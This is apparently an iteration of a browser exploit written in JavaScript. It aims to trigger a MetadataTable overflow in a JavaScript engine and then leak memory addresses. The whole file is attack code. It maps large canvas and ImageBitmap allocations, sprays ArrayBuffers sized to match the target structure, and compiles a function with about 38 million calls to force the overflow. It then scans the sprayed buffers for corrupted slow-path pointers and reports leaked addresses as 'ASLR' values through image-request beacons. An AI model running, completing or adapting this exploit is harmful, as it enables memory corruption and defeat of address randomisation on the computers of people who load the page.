// p243 - Heavy page VM mapping for MetadataTable sweep survival
// Idea: use Canvas 2D bitmaps (64MB each) + ImageBitmaps + FontFace
// to map >4GB virtual address space BEFORE compiling the overflow function.
// Canvas bitmaps are mmap'd by the browser, separate from JS heap.
// After mapping, remove DOM canvases to reduce physical pressure (MADV_FREE
// keeps the virtual mapping). Then compile + call.
// Beacon prefix: V243-

(function() {
  function B(tag) {
    try { new Image().src = '/beacon/V243-' + tag + '?t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  // =====================================================
  // PHASE 1: Map virtual memory via Canvas 2D bitmaps
  // 4096x4096 RGBA = 67,108,864 bytes (~64MB) each
  // Need ~67 canvases for 4.29GB. Try up to 80.
  // =====================================================

  var canvases = [];
  var contexts = [];
  var canvasOK = 0;
  var canvasFail = 0;
  var canvasVM = 0;

  for (var c = 0; c < 80; c++) {
    try {
      var cv = document.createElement('canvas');
      cv.width = 4096;
      cv.height = 4096;
      var ctx = cv.getContext('2d');
      if (ctx) {
        // Force bitmap allocation by drawing something
        ctx.fillStyle = '#010101';
        ctx.fillRect(0, 0, 1, 1);
        canvases.push(cv);
        contexts.push(ctx);
        canvasOK++;
        canvasVM += 64;
      } else {
        canvasFail++;
      }
    } catch(e) {
      canvasFail++;
    }

    // Beacon progress every 10
    if ((c + 1) % 10 === 0) {
      B('CANVAS-' + (c + 1) + '-OK-' + canvasOK + '-FAIL-' + canvasFail);
    }

    // Stop if we're failing repeatedly
    if (canvasFail >= 5) break;
  }

  B('P1-CANVAS-' + canvasOK + '-VM-' + canvasVM + 'MB');

  // Also try smaller canvases if big ones fail
  if (canvasVM < 4096) {
    var extraOK = 0;
    for (var c = 0; c < 200; c++) {
      try {
        var cv = document.createElement('canvas');
        cv.width = 2048;
        cv.height = 2048;
        var ctx = cv.getContext('2d');
        if (ctx) {
          ctx.fillRect(0, 0, 1, 1);
          canvases.push(cv);
          contexts.push(ctx);
          extraOK++;
          canvasVM += 16; // 2048x2048x4 = 16MB
        } else { break; }
      } catch(e) { break; }
    }
    if (extraOK > 0) B('P1-EXTRA-2K-' + extraOK + '-VM-' + canvasVM + 'MB');
  }

  // Try ImageBitmap from canvases (additional mapping)
  var bitmaps = [];
  var bitmapVM = 0;
  if (typeof createImageBitmap === 'function' && canvases.length > 0) {
    var bmpPromises = [];
    var srcCanvas = canvases[0];
    for (var b = 0; b < 20; b++) {
      try {
        bmpPromises.push(
          createImageBitmap(srcCanvas).then(function(bmp) {
            bitmaps.push(bmp);
            bitmapVM += 64;
          }).catch(function() {})
        );
      } catch(e) { break; }
    }
    // Wait briefly for promises
    Promise.all(bmpPromises).then(function() {
      B('P1-BITMAPS-' + bitmaps.length + '-VM-' + bitmapVM + 'MB');
    }).catch(function() {});
  }

  // Total VM estimate from browser resources
  var totalBrowserVM = canvasVM + bitmapVM;
  B('P1-TOTAL-BROWSER-VM-' + totalBrowserVM + 'MB');

  // =====================================================
  // PHASE 2: Spray ArrayBuffers as corruption targets
  // Stay under 2000 to avoid OOM during later compilation
  // =====================================================

  var BUF_SZ = 100096; // Match MetadataTable allocation size
  var SPRAY_COUNT = 1500;
  var targets = [];
  var tViews = [];

  try {
    for (var i = 0; i < SPRAY_COUNT; i++) {
      var ab = new ArrayBuffer(BUF_SZ);
      targets.push(ab);
      tViews.push(new Uint8Array(ab));
    }
  } catch(e) {
    B('P2-SPRAY-OOM-' + targets.length);
  }

  var sprayMB = Math.round(targets.length * BUF_SZ / 1048576);
  B('P2-SPRAY-' + targets.length + '-' + sprayMB + 'MB');

  // =====================================================
  // PHASE 3: Release physical memory, keep virtual mappings
  // Remove canvases from DOM, null contexts
  // Browser should MADV_FREE the bitmap pages
  // =====================================================

  // Don't add canvases to DOM in the first place (they're offscreen)
  // But null some context refs to allow GC of the bitmap data
  var keepCanvases = 5; // Keep a few to verify they're real
  for (var i = keepCanvases; i < contexts.length; i++) {
    contexts[i] = null;
  }

  // GC pass to reclaim physical pages
  for (var g = 0; g < 10; g++) {
    var junk = [];
    for (var j = 0; j < 20000; j++) junk.push({x: j, y: String(j)});
    junk = null;
  }

  B('P3-GC-DONE');

  // Quick test: can we still draw on a kept canvas?
  if (contexts[0]) {
    try {
      contexts[0].fillStyle = '#ff0000';
      contexts[0].fillRect(0, 0, 10, 10);
      var px = contexts[0].getImageData(0, 0, 1, 1).data;
      B('P3-CANVAS-ALIVE-' + px[0] + ',' + px[1] + ',' + px[2]);
    } catch(e) {
      B('P3-CANVAS-DEAD');
    }
  }

  // =====================================================
  // PHASE 4: Compile the 38M call function
  // =====================================================

  var N = 38348816;
  B('P4-BUILD-START');

  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);

  var parts = ['window.__p243fn=function(a){'];
  for (var c = 0; c < nChunks; c++) parts.push(callChunk);
  parts.push('a();'.repeat(rem));
  parts.push('};window.__p243ok=1;');
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('P4-BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('P4-SCRIPT-ERR'); };
  sc.onload = function() {
    if (!window.__p243ok) { B('P4-COMPILE-FAIL'); return; }
    B('P4-COMPILED-OK');

    // =====================================================
    // PHASE 5: Call the function (triggers 4.29GB sweep)
    // =====================================================

    B('P5-CALLING');
    var callCount = 0;
    try {
      window.__p243fn(function() {
        callCount++;
        if (callCount >= 1000) throw 'STOP';
      });
    } catch(e) {
      B('P5-CAUGHT-' + String(e).substring(0, 30));
    }

    B('P5-SURVIVED-CALLS-' + callCount);

    // =====================================================
    // PHASE 6: Scan targets for corruption
    // =====================================================

    setTimeout(function() {
      B('P6-SCAN');
      var hitBufs = 0;
      var leaks = [];

      for (var i = 0; i < tViews.length; i++) {
        var view = tViews[i];
        if (!view) continue;

        // Check for non-zero data at metadata entry offsets
        var hasData = false;
        for (var s = 0; s < Math.min(view.length, 1120); s += 112) {
          if (view[s + 12] !== 0 || view[s + 24] !== 0) { hasData = true; break; }
        }
        if (!hasData) continue;
        hitBufs++;

        if (hitBufs <= 10) {
          // Count non-zero bytes
          var nz = 0;
          for (var j = 0; j < Math.min(view.length, 1120); j++) if (view[j]) nz++;
          B('P6-HIT-' + i + '-nz' + nz);

          // Extract potential pointer at offset 24 (m_slowPathCallDestination)
          for (var off = 24; off + 8 <= view.length; off += 112) {
            var hasPtr = false;
            for (var b = 0; b < 8; b++) {
              if (view[off + b] !== 0) { hasPtr = true; break; }
            }
            if (!hasPtr) continue;

            var hex = '';
            for (var h = 7; h >= 0; h--) hex += (view[off+h]<16?'0':'') + view[off+h].toString(16);
            B('P6-PTR-' + i + '-O' + off + '=' + hex);
            if (leaks.length < 10) leaks.push(hex);
            break;
          }

          // Check for 0xFFFFFFFF at offset 12 (m_slowPathCount signature)
          for (var off = 12; off + 4 <= view.length; off += 112) {
            var val = (view[off] | (view[off+1]<<8) | (view[off+2]<<16) | ((view[off+3]<<24)>>>0)) >>> 0;
            if (val === 0xFFFFFFFF) {
              B('P6-FF-' + i + '-O' + off);
              break;
            }
          }
        }
      }

      B('P6-RESULT-h' + hitBufs + '-l' + leaks.length);
      for (var l = 0; l < leaks.length; l++) B('P6-ASLR-' + l + '-' + leaks[l]);
      B('DONE');
    }, 200);
  };
  document.head.appendChild(sc);
  sc.src = url;
})();
